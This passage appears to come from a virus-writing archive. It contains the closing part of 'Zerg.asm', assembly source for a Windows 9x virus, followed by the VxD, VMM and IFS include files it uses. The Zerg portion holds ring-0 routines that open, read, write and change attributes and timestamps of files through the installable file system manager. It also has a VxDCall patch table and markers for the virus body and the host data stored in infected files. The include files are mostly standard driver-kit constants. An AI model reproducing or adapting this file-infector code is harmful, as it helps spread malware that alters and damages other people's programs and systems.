                mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                push    ecx
                push    ebx
                call    ds:[hndlmisc ptr eax.hm_func+HM_ENUMHANDLE*4]
                pop     ebx
                pop     ecx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     edx,edx
                inc     edx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],edx
                dec     edx
                jz      GfnbhDone

                mov     eax,ds:Drive
                add     al,'A'-1
                cmp     al,'A'
                jb      volUNC_charFSD
                stosb
                mov     al,':'
                stosb
                dec     ecx
                dec     ecx

volUNC_charFSD: push    CodePage
                push    ecx
                lea     eax,ds:[ParsedPath ptr esi.pp_elements]
                push    eax
                push    edi
VxDCall6:       VxDCall UniToBCSPath
                add     esp,4*4
                xchg    edx,eax
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      GfnbhDone

                xchg    edx,eax
                sub     edi,ss:[pfad ptr esp.pfad_edi]
                add     eax,edi
GfnbhDone:      mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret


; open file
;   entry:
;     al  = desired access & sharing mode info
;     ebx = pointer to the ifsreq
;   return:
;     CFlag = 0 (no error)
;       eax = action performed by the FSD
;     CFlag = 1 (error)
;       eax = error code
OpenFile:       pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],al
                mov     ds:[ioreq ptr ebx.ir_options],ACTION_OPENEXISTING
                mov     eax,ss:pifshp
                lea     eax,[ifshp ptr eax.our_hfunc]
                mov     ds:[ioreq ptr ebx.ir_hfunc],eax
                mov     ds:[ioreq ptr ebx.ir_ptuninfo],0
                mov     ds:[ioreq ptr ebx.ir_pos],0
                mov     eax,ds:[ifsreq ptr ebx.ifs_psr]
                mov     eax,ds:[shres ptr eax.sr_func]
                push    ebx
                call    ds:[volfunc ptr eax.vfn_func+VFN_OPEN*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      OpenDone

                movzx   eax,ds:[ioreq ptr ebx.ir_options]
OpenDone:       mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret


; close file
;   ebx = pointer to the ifsreq
;   return:
;     CFlag = 0 (no error)
;       eax = 0
;     CFlag = 1 (error)
;       eax = error code
CloseFile:
                pushfd
                pushad

                mov     ds:[ioreq ptr ebx.ir_options],0
                mov     ds:[ioreq ptr ebx.ir_flags],CLOSE_FINAL
                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                push    ebx
                call    ds:[hndlmisc ptr eax.hm_func+HM_CLOSE*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                mov     ss:[pfad ptr esp.pfad_eax],eax

                popad
                popfd
                ret

; get/set file attributes
;   eax = Supplies new attributes for file on set commands
;   ebx = pointer to the ifsreq
; return:
;   CFlag = 0 (no error)
;     eax = attributes
;   CFlag = 1 (error)
;     eax = error code
GetFileAttributes:
                pushf
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],GET_ATTRIBUTES
                jmp     GetSetAttributes

SetFileAttributes:
                pushf
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],SET_ATTRIBUTES
                jmp     GetSetAttributes

GetSetAttributes:
                mov     ds:[ioreq ptr ebx.ir_attr],eax

                mov     eax,ds:[ifsreq ptr ebx.ifs_psr]
                mov     eax,ds:[shres ptr eax.sr_func]
                push    ebx
                call    ds:[volfunc ptr eax.vfn_func+VFN_FILEATTRIB*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      GetSetAttributesDone

                mov     eax,ds:[ioreq ptr ebx.ir_attr]
GetSetAttributesDone:
                mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret



; get/set file date and time
;   entry:
;     eax = Supplies new date and time for file on set commands
;     ebx = pointer to the ifsreq
;   return:
;     CFlag = 0 (no error)
;       eax = file date and time
;     CFlag = 1 (error)
;       eax = error code
GetFileDateTime:pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],GET_MODIFY_DATETIME
                jmp     GetSetDateTime

SetFileDateTime:pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],SET_MODIFY_DATETIME

GetSetDateTime: mov     ds:[ioreq ptr ebx.ir_dostime],eax
                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                push    ebx
                call    ds:[hndlmisc ptr eax.hm_func+HM_FILETIMES*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      FileDateTimeDone

                mov     eax,ds:[ioreq ptr ebx.ir_dostime]
FileDateTimeDone:
                mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret


; set ST structure and read file
SetST&ReadFile: mov     ds:[st ptr (esi-size st).st_size],cx
                mov     ds:[st ptr (esi-size st).st_pt],edx

; read/write file
;   entry:
;     ebx = pointer to the ifsreq
;     ecx = number of bytes to read/write
;     edx = file position to begin reading/writing at
;     esi = pointer to the data buffer to read/write
;   return:
;     CFlag = 0 (no error)
;       eax = number of bytes actually read/written
;       edx = new file position
;     CFlag = 1 (error)
;       eax = error code
ReadFile:       pushfd
                pushad
                mov     eax,ss:FSDFnAddr
                cmp     ss:FunctionNum,IFSFN_READ
                je      ReadWriteCommon
                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_read]
                jmp     ReadWriteCommon

WriteFile:      pushfd
                pushad
                mov     eax,ss:FSDFnAddr
                cmp     ss:FunctionNum,IFSFN_WRITE
                je      ReadWriteCommon
                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_write]

ReadWriteCommon:mov     ds:[ioreq ptr ebx.ir_data],esi
                mov     ds:[ioreq ptr ebx.ir_length],ecx
                mov     ds:[ioreq ptr ebx.ir_pos],edx
                mov     ds:[ioreq ptr ebx.ir_options],0

                push    ebx
                call    eax
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      ReadWriteDone

                mov     eax,ds:[ioreq ptr ebx.ir_pos]
                mov     ss:[pfad ptr esp.pfad_edx],eax
                mov     eax,ds:[ioreq ptr ebx.ir_length]
ReadWriteDone:  mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret

; for patch VxDCall code
VxDCall_tbl     dd      VxDCall0,VxDCall1,VxDCall2,VxDCall3
                dd      VxDCall4,VxDCall5,VxDCall6
                dd      VxDCall8
VxDCall_tbl_size equ    ($-VxDCall_tbl)

vir_end:
                ; for define memory data
vir_mem_end:
                org     vir_end
                ; for define file data
HostData        host_data       <0>
vir_file_end:

                end     start
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[Zerg.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VXD.INC]컴�

PG_VM           EQU     0
PG_SYS          EQU     1
PG_RESERVED1    EQU     2
PG_PRIVATE      EQU     3
PG_RESERVED2    EQU     4
PG_RELOCK       EQU     5
PG_INSTANCE     EQU     6
PG_HOOKED       EQU     7
PG_IGNORE       EQU     0FFFFFFFFH

PAGEZEROINIT            EQU     00000001H
PAGEUSEALIGN            EQU     00000002H
PAGECONTIG              EQU     00000004H
PAGEFIXED               EQU     00000008H
PAGEDEBUGNULFAULT       EQU     00000010H
PAGEZEROREINIT          EQU     00000020H
PAGENOCOPY              EQU     00000040H
PAGELOCKED              EQU     00000080H
PAGELOCKEDIFDP          EQU     00000100H
PAGESETV86PAGEABLE      EQU     00000200H
PAGECLEARV86PAGEABLE    EQU     00000400H
PAGESETV86INTSLOCKED    EQU     00000800H
PAGECLEARV86INTSLOCKED  EQU     00001000H
PAGEMARKPAGEOUT         EQU     00002000H
PAGEPDPSETBASE          EQU     00004000H
PAGEPDPCLEARBASE        EQU     00008000H
PAGEDISCARD             EQU     00010000H
PAGEPDPQUERYDIRTY       EQU     00020000H
PAGEMAPFREEPHYSREG      EQU     00040000H
PAGENOMOVE              EQU     10000000H
PAGEMAPGLOBAL           EQU     40000000H
PAGEMARKDIRTY           EQU     80000000H

_PageAllocate                   equ     00010053h
_Debug_Out_Service              equ     000100f4h
IOS_SendCommand                 equ     00100004h

IFSMgr_Get_Version              equ     00400000h
IFSMgr_RegisterMount            equ     00400001h
IFSMgr_RegisterNet              equ     00400002h
IFSMgr_RegisterMailSlot         equ     00400003h
IFSMgr_Attach                   equ     00400004h
IFSMgr_Detach                   equ     00400005h
IFSMgr_Get_NetTime              equ     00400006h
IFSMgr_Get_DOSTime              equ     00400007h
IFSMgr_SetupConnection          equ     00400008h
IFSMgr_DerefConnection          equ     00400009h
IFSMgr_ServerDOSCall            equ     0040000Ah
IFSMgr_CompleteAsync            equ     0040000Bh
IFSMgr_RegisterHeap             equ     0040000Ch
IFSMgr_GetHeap                  equ     0040000Dh
IFSMgr_RetHeap                  equ     0040000Eh
IFSMgr_CheckHeap                equ     0040000Fh
IFSMgr_CheckHeapItem            equ     00400010h
IFSMgr_FillHeapSpare            equ     00400011h
IFSMgr_Block                    equ     00400012h
IFSMgr_Wakeup                   equ     00400013h
IFSMgr_Yield                    equ     00400014h
IFSMgr_SchedEvent               equ     00400015h
IFSMgr_QueueEvent               equ     00400016h
IFSMgr_KillEvent                equ     00400017h
IFSMgr_FreeIOReq                equ     00400018h
IFSMgr_MakeMailSlot             equ     00400019h
IFSMgr_DeleteMailSlot           equ     0040001Ah
IFSMgr_WriteMailSlot            equ     0040001Bh
IFSMgr_PopUp                    equ     0040001Ch
IFSMgr_printf                   equ     0040001Dh
IFSMgr_AssertFailed             equ     0040001Eh
IFSMgr_LogEntry                 equ     0040001Fh
IFSMgr_DebugMenu                equ     00400020h
IFSMgr_DebugVars                equ     00400021h
IFSMgr_GetDebugString           equ     00400022h
IFSMgr_GetDebugHexNum           equ     00400023h
IFSMgr_NetFunction              equ     00400024h
IFSMgr_DoDelAllUses             equ     00400025h
IFSMgr_SetErrString             equ     00400026h
IFSMgr_GetErrString             equ     00400027h
IFSMgr_SetReqHook               equ     00400028h
IFSMgr_SetPathHook              equ     00400029h
IFSMgr_UseAdd                   equ     0040002Ah
IFSMgr_UseDel                   equ     0040002Bh
IFSMgr_InitUseAdd               equ     0040002Ch
IFSMgr_ChangeDir                equ     0040002Dh
IFSMgr_DelAllUses               equ     0040002Eh
IFSMgr_CDROM_Attach             equ     0040002Fh
IFSMgr_CDROM_Detach             equ     00400030h
IFSMgr_Win32DupHandle           equ     00400031h
IFSMgr_Ring0_FileIO             equ     00400032h
IFSMgr_Toggle_Extended_File_Handles equ 00400033h
IFSMgr_Get_Drive_Info           equ     00400034h
IFSMgr_Ring0GetDriveInfo        equ     00400035h
IFSMgr_BlockNoEvents            equ     00400036h
IFSMgr_NetToDosTime             equ     00400037h
IFSMgr_DosToNetTime             equ     00400038h
IFSMgr_DosToWin32Time           equ     00400039h
IFSMgr_Win32ToDosTime           equ     0040003Ah
IFSMgr_NetToWin32Time           equ     0040003Bh
IFSMgr_Win32ToNetTime           equ     0040003Ch
IFSMgr_MetaMatch                equ     0040003Dh
IFSMgr_TransMatch               equ     0040003Eh
IFSMgr_CallProvider             equ     0040003Fh
UniToBCS                        equ     00400040h
UniToBCSPath                    equ     00400041h
BCSToUni                        equ     00400042h
UniToUpper                      equ     00400043h
UniCharToOEM                    equ     00400044h
CreateBasis                     equ     00400045h
MatchBasisName                  equ     00400046h
AppendBasisTail                 equ     00400047h
FcbToShort                      equ     00400048h
ShortToFcb                      equ     00400049h
IFSMgr_ParsePath                equ     0040004Ah
Query_PhysLock                  equ     0040004Bh
_VolFlush                       equ     0040004Ch
NotifyVolumeArrival             equ     0040004Dh
NotifyVolumeRemoval             equ     0040004Eh
QueryVolumeRemoval              equ     0040004Fh
IFSMgr_FSDUnmountCFSD           equ     00400050h
IFSMgr_GetConversionTablePtrs   equ     00400051h
IFSMgr_CheckAccessConflict      equ     00400052h
IFSMgr_LockFile                 equ     00400053h
IFSMgr_UnlockFile               equ     00400054h
IFSMgr_RemoveLocks              equ     00400055h
IFSMgr_CheckLocks               equ     00400056h
IFSMgr_CountLocks               equ     00400057h
IFSMgr_ReassignLockFileInst     equ     00400058h
IFSMgr_UnassignLockList         equ     00400059h
IFSMgr_MountChildVolume         equ     0040005Ah
IFSMgr_UnmountChildVolume       equ     0040005Bh
IFSMgr_SwapDrives               equ     0040005Ch
IFSMgr_FSDMapFHtoIOREQ          equ     0040005Dh
IFSMgr_FSDParsePath             equ     0040005Eh
IFSMgr_FSDAttachSFT             equ     0040005Fh
IFSMgr_GetTimeZoneBias          equ     00400060h
IFSMgr_PNPEvent                 equ     00400061h
IFSMgr_RegisterCFSD             equ     00400062h
IFSMgr_Win32MapExtendedHandleToSFT equ  00400063h
IFSMgr_DbgSetFileHandleLimit    equ     00400064h
IFSMgr_Win32MapSFTToExtendedHandle equ  00400065h
IFSMgr_FSDGetCurrentDrive       equ     00400066h
IFSMgr_InstallFileSystemApiHook equ     00400067h
IFSMgr_RemoveFileSystemApiHook  equ     00400068h
IFSMgr_RunScheduledEvents       equ     00400069h
IFSMgr_CheckDelResource         equ     0040006Ah
IFSMgr_Win32GetVMCurdir         equ     0040006Bh
IFSMgr_SetupFailedConnection    equ     0040006Ch
_GetMappedErr                   equ     0040006Dh
ShortToLossyFcb                 equ     0040006Eh
IFSMgr_GetLockState             equ     0040006Fh
BcsToBcs                        equ     00400070h
IFSMgr_SetLoopback              equ     00400071h
IFSMgr_ClearLoopback            equ     00400072h
IFSMgr_ParseOneElement          equ     00400073h
BcsToBcsUpper                   equ     00400074h


VxDCall         macro   fn
                local   x
                int     20h
                dd      fn
                jmp     x
                dd      fn      ; for patch VxDCall code
x:
                endm

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VXD.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VMM.INC]컴�

Client_Reg_Struc        STRUC
Client_EDI      DD      ?
Client_ESI      DD      ?
Client_EBP      DD      ?
Client_res0     DD      ?
Client_EBX      DD      ?
Client_EDX      DD      ?
Client_ECX      DD      ?
Client_EAX      DD      ?
Client_Error    DD      ?
Client_EIP      DD      ?
Client_CS       DW      ?
Client_res1     DW      ?
Client_EFlags   DD      ?
Client_ESP      DD      ?
Client_SS       DW      ?
Client_res2     DW      ?
Client_ES       DW      ?
Client_res3     DW      ?
Client_DS       DW      ?
Client_res4     DW      ?
Client_FS       DW      ?
Client_res5     DW      ?
Client_GS       DW      ?
Client_res6     DW      ?
Client_Alt_EIP  DD      ?
Client_Alt_CS   DW      ?
Client_res7     DW      ?
Client_Alt_EFlags       DD      ?
Client_Alt_ESP  DD      ?
Client_Alt_SS   DW      ?
Client_res8     DW      ?
Client_Alt_ES   DW      ?
Client_res9     DW      ?
Client_Alt_DS   DW      ?
Client_res10    DW      ?
Client_Alt_FS   DW      ?
Client_res11    DW      ?
Client_Alt_GS   DW      ?
Client_res12    DW      ?
Client_Reg_Struc        ENDS

Client_Word_Reg_Struc   STRUC
Client_DI       DW      ?
Client_res13    DW      ?
Client_SI       DW      ?
Client_res14    DW      ?
Client_BP       DW      ?
Client_res15    DW      ?
Client_res16    DD      ?
Client_BX       DW      ?
Client_res17    DW      ?
Client_DX       DW      ?
Client_res18    DW      ?
Client_CX       DW      ?
Client_res19    DW      ?
Client_AX       DW      ?
Client_res20    DW      ?
Client_res21    DD      ?
Client_IP       DW      ?
Client_res22    DW      ?
Client_res23    DD      ?
Client_Flags    DW      ?
Client_res24    DW      ?
Client_SP       DW      ?
Client_res25    DW      ?
Client_res26    DD      5 DUP (?)
Client_Alt_IP   DW      ?
Client_res27    DW      ?
Client_res28    DD      ?
Client_Alt_Flags        DW      ?
Client_res29    DW      ?
Client_Alt_SP   DW      ?
Client_Word_Reg_Struc   ENDS

Client_Byte_Reg_Struc   STRUC
Client_res30    DD      4 DUP (?)
Client_BL       DB      ?
Client_BH       DB      ?
Client_res31    DW      ?
Client_DL       DB      ?
Client_DH       DB      ?
Client_res32    DW      ?
Client_CL       DB      ?
Client_CH       DB      ?
Client_res33    DW      ?
Client_AL       DB      ?
Client_AH       DB      ?
Client_Byte_Reg_Struc   ENDS

CLIENT_STRUCT   union
CRS             Client_Reg_Struc        ?
CWRS            Client_Word_Reg_Struc   ?
CBRS            Client_Byte_Reg_Struc   ?
CLIENT_STRUCT   ends

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VMM.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[IFS.INC]컴�

IFSMgr_Device_ID        equ     000040h ; Installable File System Manager
IFSMgr_Init_Order       equ     010000h + V86MMGR_Init_Order
FSD_Init_Order          equ     000100h + IFSMgr_Init_Order


ubuffer_t       equ     <dd>
pos_t           equ     <dd>
uid_t           equ     <db>
sfn_t           equ     <dw>
$F              equ     <dd>

path_t          equ     <dd>
string_t        equ     <dd>
pid_t           equ     <dd>
rh_t            equ     <dd>
fh_t            equ     <dd>
vfunc_t         equ     <dd>
$P              equ     <dd>
$I              equ     <dd>
fsdwork struc
        dd      16 dup (?)
fsdwork ends


IFS_VERSION     equ     0030Ah
IFS_REVISION    equ     010h


;*      Maximum path length - excluding nul
MAX_PATH        equ     260     ; Maximum path length - including nul

; Maximum length for a LFN name element - excluding nul
LFNMAXNAMELEN   equ     255


MAXIMUM_USERID  equ     2       ; max. # of users that can be logged
                                        ; on at the same time.  Ir_user must
                                        ; always be less than MAXIMUM_USERID.
NULL_USER_ID    equ     0       ; special user id for operations when
                                        ; not logged on.

; Status indications returned as errors:
STATUS_PENDING  equ     -1      ; request is pending
STATUS_RAWLOCK  equ     -2      ; rawlock active on session
                                        ; (only returned for async requests,
                                        ;  sync requests will wait for the raw
                                        ;  lock to be released)
STATUS_BUSY     equ     -3      ; request can't be started because of
                                        ; serialization.

;*      ANYPROID - Any Provider ID
ANYPROID        equ     -1


;*      Common function defintions for NetFunction
NF_PROCEXIT             equ     0111Dh  ; Process Exit sent (ID = ANYPROID)
NF_DRIVEUSE             equ     00001h  ; Drive Use Created (ID = ID of owner FSD)
NF_DRIVEUNUSE           equ     00002h  ; Drive Use Broken (ID = ID of owner FSD)
NF_GETPRINTJOBID        equ     00003h  ; Get Print Job ID
                                          ; ir_fh - ptr to master file info
                                          ; ir_data - ptr to data buffer
                                          ; ir_length - IN: buffer size
                                          ;             OUT: amount transfered
                                          ; ir_SFN - SFN of file handle
NF_PRINTERUSE           equ     00004h  ; Printer Use Created (ID = ID of owner FSD)
NF_PRINTERUNUSE         equ     00005h  ; Printer Use Broken (ID = ID of owner FSD)
NF_NetSetUserName       equ     01181h

;* Flags passed to NetFunction
WIN32_CALLFLAG          equ     004h    ; call is Win32 api


;* dos_time - DOS time & date format
;typedef struct dos_time dos_time;
dos_time        struc
  dt_time       dw      ?
  dt_date       dw      ?
dos_time        ends


aux_data struc
  aux_dword     dd      ?
aux_data ends
aux_ul  equ     aux_dword
aux_ui  equ     aux_dword
aux_vf  equ     aux_dword
aux_hf  equ     aux_dword
aux_ptr equ     aux_dword
aux_str equ     aux_dword
aux_pp  equ     aux_dword
aux_buf equ     aux_dword
aux_dt  equ     aux_dword


ioreq   struc
  % ir_length   $I      ?       ; length of user buffer (eCX)
  ir_flags      db      ?       ; misc. status flags (AL)
  % ir_user     uid_t   ?       ; user ID for this request
  % ir_sfn      sfn_t   ?       ; System File Number of file handle
  % ir_pid      pid_t   ?       ; process ID of requesting task
  % ir_ppath    path_t  ?       ; unicode pathname
  ir_aux1       dd      ?       ; secondary user data buffer (CurDTA)
  % ir_data   ubuffer_t ?       ; ptr to user data buffer (DS:eDX)
  ir_options    dw      ?       ; request handling options
  ir_error      dw      ?       ; error code (0 if OK)
  % ir_rh       rh_t    ?       ; resource handle
  % ir_fh       fh_t    ?       ; file (or find) handle
  % ir_pos      pos_t   ?       ; file position for request
  ir_aux2       dd      ?       ; misc. extra API parameters
  ir_aux3       dd      ?       ; misc. extra API parameters
  % ir_pev      $P      ?       ; ptr to IFSMgr event for async requests
  ir_fsd        db      (size fsdwork) dup (?)  ; Provider work space
ioreq   ends


; misc. fields overlayed with other ioreq members:
ir_size         equ     ir_pos
ir_conflags     equ     ir_pos  ; flags for connect
ir_attr2        equ     ir_pos  ; destination attributes for Rename
ir_attr         equ     ir_length ; DOS file attribute info
ir_pathSkip     equ     ir_length ; # of path elements consumed by Connect
ir_lananum      equ     ir_sfn  ; LanA to Connect on (0xFF for any net)
ir_tuna         equ     ir_sfn  ; Mount: FSD authorises IFSMGR tunneling
ir_ptuninfo     equ     ir_data ; Rename/Create: advisory tunneling info ptr

; Fields overlayed with ir_options:
ir_namelen      equ     ir_options
ir_sectors      equ     ir_options      ; sectors per cluster
ir_status       equ     ir_options      ; named pipe status

; Fields overlayed with ir_aux1:
ir_data2        equ     <ir_aux1.aux_buf>       ; secondary data buffer
ir_vfunc        equ     <ir_aux1.aux_vf>        ; volume function vector
ir_hfunc        equ     <ir_aux1.aux_hf>        ; file handle function vector
ir_ppath2       equ     <ir_aux1.aux_pp>        ; second pathname for Rename
ir_volh         equ     <ir_aux1.aux_ul>        ; VRP address for Mount

; Fields overlayed with ir_aux2:
ir_numfree      equ     <ir_aux2.aux_ul>        ; number of free clusters
ir_locklen      equ     <ir_aux2.aux_ul>        ; length of lock region
ir_msglen       equ     <ir_aux2.aux_ui>        ; length of current message (peek pipe)
                                                        ; next msg length for mailslots
ir_dostime      equ     <ir_aux2.aux_dt>        ; DOS file date & time stamp
ir_timeout      equ     <ir_aux2.aux_ul>        ; timeout value in milliseconds
ir_password     equ     <ir_aux2.aux_ptr>       ; password for Connect
ir_drvh         equ     <ir_aux2.aux_ptr>       ; drive handle for Mount
ir_prtlen       equ     <ir_aux2.aux_dt.dt_time>; length of printer setup string
ir_prtflag      equ     <ir_aux2.aux_dt.dt_date>; printer flags
ir_firstclus    equ     <ir_aux2.aux_ui>        ; First cluster of file
ir_mntdrv       equ     <ir_aux2.aux_ul>        ; driveletter for Mount
ir_cregptr      equ     <ir_aux2.aux_ptr>       ; pointer to client registers
ir_uFName       equ     <ir_aux2.aux_str>       ; case preserved filename

; Fields overlayed with ir_aux3:
ir_upath        equ     <ir_aux3.aux_str>       ; pointer to unparsed pathname
ir_scratch      equ     <ir_aux3.aux_ptr>       ; scratch buffer for NetFunction calls

; Fields overlayed with ir_user:
ir_drivenum     equ     ir_user         ; Logical drive # (when mounting)


;* hndlfunc - I/O functions for file handles
NUM_HNDLMISC    equ     8

;typedef struct hndlmisc hndlmisc;
hndlfunc        struc
  % hf_read     $P      ?       ; file read handler function
  % hf_write    $P      ?       ; file write handler function
  % hf_misc     $P      ?       ; ptr to misc. function vector
hndlfunc        ends

hndlmisc        struc
  hm_version    dw      ?       ; IFS version #
  hm_revision   db      ?       ; IFS interface revision #
  hm_size       db      ?       ; # of entries in table
  % hm_func     $P      NUM_HNDLMISC dup (?)
hndlmisc        ends

HM_SEEK         equ     0       ; Seek file handle
HM_CLOSE        equ     1       ; close handle
HM_COMMIT       equ     2       ; commit buffered data for handle
HM_FILELOCKS    equ     3       ; lock/unlock byte range
HM_FILETIMES    equ     4       ; get/set file modification time
HM_PIPEREQUEST  equ     5       ; named pipe operations
HM_HANDLEINFO   equ     6       ; get/set file information
HM_ENUMHANDLE   equ     7       ; enum filename from handle, lock info


;*      volfunc - volume based api fucntions
NUM_VOLFUNC     equ     15

volfunc         struc
  vfn_version   dw      ?       ; IFS version #
  vfn_revision  db      ?       ; IFS interface revision #
  vfn_size      db      ?       ; # of entries in table
  % vfn_func    $P      NUM_VOLFUNC dup (?)     ; volume base function handlers
volfunc ends

VFN_DELETE      equ     0               ; file delete
VFN_DIR         equ     1               ; directory manipulation
VFN_FILEATTRIB  equ     2               ; DOS file attribute manipulation
VFN_FLUSH       equ     3               ; flush volume
VFN_GETDISKINFO equ     4               ; query volume free space
VFN_OPEN        equ     5               ; open file
VFN_RENAME      equ     6               ; rename path
VFN_SEARCH      equ     7               ; search for names
VFN_QUERY       equ     8               ; query resource info (network only)
VFN_DISCONNECT  equ     9               ; disconnect from resource (net only)
VFN_UNCPIPEREQ  equ     10              ; UNC path based named pipe operations
VFN_IOCTL16DRIVE equ    11              ; drive based 16 bit IOCTL requests
VFN_GETDISKPARMS equ    12              ; get DPB
VFN_FINDOPEN    equ     13              ; open  an LFN file search
VFN_DASDIO      equ     14              ; direct volume access


;* IFS Function IDs passed to IFSMgr_CallProvider
IFSFN_READ      equ     0               ; read a file
IFSFN_WRITE     equ     1               ; write a file
IFSFN_FINDNEXT  equ     2               ; LFN handle based Find Next
IFSFN_FCNNEXT   equ     3               ; Find Next Change Notify
IFSFN_SEEK      equ     10              ; Seek file handle
IFSFN_CLOSE     equ     11              ; close handle
IFSFN_COMMIT    equ     12              ; commit buffered data for handle
IFSFN_FILELOCKS equ     13              ; lock/unlock byte range
IFSFN_FILETIMES equ     14              ; get/set file modification time
IFSFN_PIPEREQUEST equ   15              ; named pipe operations
IFSFN_HANDLEINFO equ    16              ; get/set file information
IFSFN_ENUMHANDLE equ    17              ; enum file handle information
IFSFN_FINDCLOSE equ     18              ; LFN find close
IFSFN_FCNCLOSE  equ     19              ; Find Change Notify Close
IFSFN_CONNECT   equ     30              ; connect or mount a resource
IFSFN_DELETE    equ     31              ; file delete
IFSFN_DIR       equ     32              ; directory manipulation
IFSFN_FILEATTRIB equ    33              ; DOS file attribute manipulation
IFSFN_FLUSH     equ     34              ; flush volume
IFSFN_GETDISKINFO equ   35              ; query volume free space
IFSFN_OPEN      equ     36              ; open file
IFSFN_RENAME    equ     37              ; rename path
IFSFN_SEARCH    equ     38              ; search for names
IFSFN_QUERY     equ     39              ; query resource info (network only)
IFSFN_DISCONNECT equ    40              ; disconnect from resource (net only)
IFSFN_UNCPIPEREQ equ    41              ; UNC path based named pipe operations
IFSFN_IOCTL16DRIVE equ  42              ; drive based 16 bit IOCTL requests
IFSFN_GETDISKPARMS equ  43              ; get DPB
IFSFN_FINDOPEN  equ     44              ; open  an LFN file search
IFSFN_DASDIO    equ     45              ; direct volume access


;*      Resource types passed in on the File Hook:
IFSFH_RES_UNC           equ     001h    ; UNC resource
IFSFH_RES_NETWORK       equ     008h    ; Network drive connection
IFSFH_RES_LOCAL         equ     010h    ; Local drive
IFSFH_RES_CFSD          equ     080h    ; Character FSD


;* values for ir_options to Connect:
; Note that only one of RESOPT_UNC_REQUEST, RESOPT_DEV_ATTACH, and
; RESOPT_UNC_CONNECT may be set at once.
RESOPT_UNC_REQUEST      equ     001h    ; UNC-style path based request
RESOPT_DEV_ATTACH       equ     002h    ; explicit redirection of a device
RESOPT_UNC_CONNECT      equ     004h    ; explicit UNC-style use
RESOPT_DISCONNECTED     equ     008h    ; Set up connection disconnected
                                                ; (Don't touch net)
RESOPT_NO_CREATE        equ     010h    ; don't create a new resource
RESOPT_STATIC           equ     020h    ; don't allow ui to remove


;* values for ir_flags to Connect:
RESTYPE_WILD    equ     0               ; wild card service type
RESTYPE_DISK    equ     1               ; disk resource
RESTYPE_SPOOL   equ     2               ; spooled printer
RESTYPE_CHARDEV equ     3               ; character device
RESTYPE_IPC     equ     4               ; interprocess communication
FIRST_RESTYPE   equ     RESTYPE_DISK
LAST_RESTYPE    equ     RESTYPE_IPC


;* values for ir_options to Close *
RESOPT_NO_IO    equ     001h    ; no I/O allowed during the operation


;* values for ir_flags for FSD operations
IR_FSD_MOUNT    equ     0               ; mount volume
IR_FSD_DISMOUNT equ     1               ; dismount volume
IR_FSD_VERIFY   equ     2               ; verify volume
IR_FSD_UNLOAD   equ     3               ; unload volume
IR_FSD_MOUNT_CHILD equ  4               ; mount child volume
IR_FSD_MAP_DRIVE equ    5               ; change drive mapping
IR_FSD_UNMAP_DRIVE equ  6               ; reset drive mapping


;* Value for ir_error from IR_FSD_MOUNT if volume exists *
ERROR_IFSVOL_EXISTS     equ     284     ; mounted volume already exists


;* Values returned in ir_tuna from IR_FSD_MOUNT (default IR_TUNA_NOTUNNEL)
IR_TUNA_NOTUNNEL        equ     0       ; Disable IFSMGR tunneling on volume
IR_TUNA_FSDTUNNEL       equ     0       ; FSD implements tunneling itself
